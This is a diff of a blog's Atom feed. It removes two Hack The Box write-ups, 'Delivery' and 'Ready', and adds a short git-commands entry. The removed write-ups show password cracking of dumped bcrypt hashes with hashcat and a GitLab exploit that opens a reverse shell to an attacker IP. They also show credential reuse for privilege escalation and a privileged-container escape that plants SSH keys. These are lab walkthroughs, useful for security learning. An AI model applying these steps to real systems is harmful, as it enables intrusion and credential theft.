-        &quot;DataSource&quot;: &quot;mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s&quot;,
-[...]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;We’ll connect to the database server and poke around.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;maildeliverer@Delivery:/$ mysql -u mmuser --password='Crack_The_MM_Admin_PW'
-Welcome to the MariaDB monitor.  Commands end with ; or \g.
-Your MariaDB connection id is 91
-Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
-
-Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
-
-Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
-
-MariaDB [(none)]&amp;gt; show databases;
-+--------------------+
-| Database           |
-+--------------------+
-| information_schema |
-| mattermost         |
-+--------------------+
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;MatterMost user accounts are stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Users&lt;/code&gt; table and hashed with bcrypt. We’ll save the hashes then try to crack them offline.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;MariaDB [(none)]&amp;gt; use mattermost;
-Reading table information for completion of table and column names
-You can turn off this feature to get a quicker startup with -A
-
-Database changed
-MariaDB [mattermost]&amp;gt; select Username,Password from Users;
-+----------------------------------+--------------------------------------------------------------+
-| Username                         | Password                                                     |
-+----------------------------------+--------------------------------------------------------------+
-| surveybot                        |                                                              |
-| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
-| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
-| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
-| snowscan                         | $2a$10$spHk8ZGr54VWf4kNER/IReO.I63YH9d7WaYp9wjiRswDMR.P/Q9aa |
-| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
-| channelexport                    |                                                              |
-| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
-+----------------------------------+--------------------------------------------------------------+
-8 rows in set (0.002 sec)
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;cracking-with-rules&quot;&gt;Cracking with rules&lt;/h2&gt;
-
-&lt;p&gt;There was a hint earlier that some variation of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PleaseSubscribe!&lt;/code&gt; is used.&lt;/p&gt;
-
-&lt;p&gt;I’ll use hashcat for this and since I don’t know the hash ID for bcrypt by heart I can find it in the help.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\bin\hashcat&amp;gt;hashcat --help | findstr bcrypt
-   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;My go-to rules is normally one of those two ruleset:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule&quot;&gt;https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule&quot;&gt;https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;These will perform all sort of transformations on the wordlist and we can quickly crack the password: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PleaseSubscribe!21&lt;/code&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;C:\bin\hashcat&amp;gt;hashcat -a 0 -m 3200 -w 3 -O -r rules\_NSAKEY.v2.dive.rule hash.txt wordlist.txt
-[...]
-$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
-
-Session..........: hashcat
-Status...........: Cracked
-Hash.Name........: bcrypt $2*$, Blowfish (Unix)
-[...]
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;The root password from MatterMost is the same as the local root password so we can just su to root and get the system flag.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-delivery/root.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="hackthebox" /><category term="infosec" /><category term="osticket" /><category term="mysql" /><category term="mattermost" /><category term="hashcat" /><category term="rules" /><summary type="html">Delivery is a quick and fun easy box where we have to create a MatterMost account and validate it by using automatic email accounts created by the OsTicket application. The admins on this platform have very poor security practices and put plaintext credentials in MatterMost. Once we get the initial shell with the creds from MatterMost we'll poke around MySQL and get a root password bcrypt hash. Using a hint left in the MatterMost channel about the password being a variation of PleaseSubscribe!, we'll use hashcat combined with rules to crack the password then get the root shell.</summary></entry><entry><title type="html">Ready - Hack The Box</title><link href="http://localhost:4000/htb-writeup-ready/" rel="alternate" type="text/html" title="Ready - Hack The Box" /><published>2021-05-15T00:00:00+02:00</published><updated>2021-05-15T00:00:00+02:00</updated><id>http://localhost:4000/htb-writeup-ready</id><content type="html" xml:base="http://localhost:4000/htb-writeup-ready/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/ready_logo.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ready was a pretty straighforward box to get an initial shell on: We identify that’s it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once inside, we quickly figure out we’re in a container and by looking at the docker compose file we can see the container is running in privileged mode. We then mount the host filesystem within the container then we can access the flag or add our SSH keys to the host root user home directory.&lt;/p&gt;
-
-&lt;h2 id=&quot;portscan&quot;&gt;Portscan&lt;/h2&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sudo nmap -T4 -sC -sV -oA scan -p- 10.129.149.31
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-09 22:41 EDT
-Nmap scan report for 10.129.149.31
-Host is up (0.015s latency).
-Not shown: 65533 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
-|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
-|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
-5080/tcp open  http    nginx
-| http-robots.txt: 53 disallowed entries (15 shown)
-| / /autocomplete/users /search /api /admin /profile 
-| /dashboard /projects/new /groups/new /groups/*/edit /users /help 
-|_/s/ /snippets/new /snippets/*/edit
-| http-title: Sign in \xC2\xB7 GitLab
-|_Requested resource was http://10.129.149.31:5080/users/sign_in
-|_http-trane-info: Problem with XML parsing of /evox/about
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h2 id=&quot;gitlab&quot;&gt;Gitlab&lt;/h2&gt;
-
-&lt;p&gt;The webserver on port 5080 runs a Gitlab instance.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/gitlab1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;We have access to create a new account.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/gitlab2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Once logged in, we see in the projects list there’s a single projet called &lt;em&gt;ready-channel&lt;/em&gt;.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/gitlab3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;To check the Gitlab version we go to the Help section and we can see it’s running 11.4.7.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/gitlab5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;A quick search on Exploit-DB shows there’s an authenticated remote code execution vulnerability for this exact version.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/gitlab6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;python3 exploit.py -g http://10.129.149.31 -u snowscan2 -p yolo1234 -l 10.10.14.4 -P 4444&lt;/code&gt;&lt;/p&gt;
-
-&lt;p&gt;Reverse shell connection:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/shell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/user.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;privesc&quot;&gt;Privesc&lt;/h2&gt;
-
-&lt;p&gt;By running &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite&quot;&gt;linpeas.sh&lt;/a&gt; we find a backup file with some SMTP credentials for the gitlab application.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Found /opt/backup/gitlab.rb
-gitlab_rails['smtp_password'] = &quot;wW59U!ZKMbG9+*#h&quot;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;That password is the same password as the root password for the container so we can privesc locally inside the container.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git@gitlab:/opt/backup$ su -l root
-su -l root
-Password: wW59U!ZKMbG9+*#h
-
-root@gitlab:~# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;There’s a root_pass file in the root of the filesystem but that’s not useful.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;cat /root_pass
-YG65407Bjqvv9A0a8Tm_7w
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;If we look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/opt/backup/docker-compose.yml&lt;/code&gt; configuration file, we can see it’s a hint that we’re running in a privileged container:&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    volumes:
-      - './srv/gitlab/config:/etc/gitlab'
-      - './srv/gitlab/logs:/var/log/gitlab'
-      - './srv/gitlab/data:/var/opt/gitlab'
-      - './root_pass:/root_pass'
-    privileged: true
-    restart: unless-stopped
-    #mem_limit: 1024m
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Privileged containers can access the host’s disk devices so we can just read the root flag after mounting the drive.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-ready/root.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;To get a proper shell in the host OS we can drop our SSH keys in the root’s .ssh directory.&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@gitlab:~# mount /dev/sda2 /mnt
-mount /dev/sda2 /mnt
-root@gitlab:~# echo 'ssh-rsa AAAAB3NzaC1y[...]+HUBS+l32faXPc= snowscan@kali' &amp;gt; /mnt/root/.ssh/authorized_keys
-
-[...]
-
-$ ssh root@10.129.150.37
-The authenticity of host '10.129.150.37 (10.129.150.37)' can't be established.
-ECDSA key fingerprint is SHA256:7+5qUqmyILv7QKrQXPArj5uYqJwwe7mpUbzD/7cl44E.
-Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
-Warning: Permanently added '10.129.150.37' (ECDSA) to the list of known hosts.
-Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-40-generic x86_64)
-
-[...]
-
-The list of available updates is more than a week old.
-To check for new updates run: sudo apt update
-
-Last login: Thu Feb 11 14:28:18 2021
-root@ready:~# cat root.txt
-b7f98681505cd39066f67147b103c2b3
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="hackthebox" /><category term="infosec" /><category term="linux" /><category term="gitlab" /><category term="cve" /><category term="docker" /><category term="privileged container" /><summary type="html">Ready was a pretty straighforward box to get an initial shell on: We identify that's it running a vulnerable instance of Gitlab and we use an exploit against version 11.4.7 to land a shell. Once inside, we quickly figure out we're in a container and by looking at the docker compose file we can see the container is running in privileged mode. We then mount the host filesystem within the container then we can access the flag or add our SSH keys to the host root user home directory.</summary></entry></feed>
+git push &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; origin master 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>PepperOnion</name><email>pentesting4free@gmail.com</email></author><category term="git" /><summary type="html">Commands you may need to update github repository.</summary></entry></feed>
